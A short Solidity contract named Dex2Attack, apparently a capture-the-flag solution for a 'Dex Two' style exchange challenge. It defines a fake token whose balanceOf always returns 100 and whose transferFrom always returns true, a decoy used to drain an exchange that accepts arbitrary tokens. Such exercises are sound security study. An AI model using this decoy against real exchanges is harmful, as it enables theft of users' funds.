// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Dex2Attack{ 
    function balanceOf(address) external  pure returns(uint256) {
        return 100;
    }

    function transferFrom(address, address, uint256) external  pure returns (bool) {
        return true;
    }
}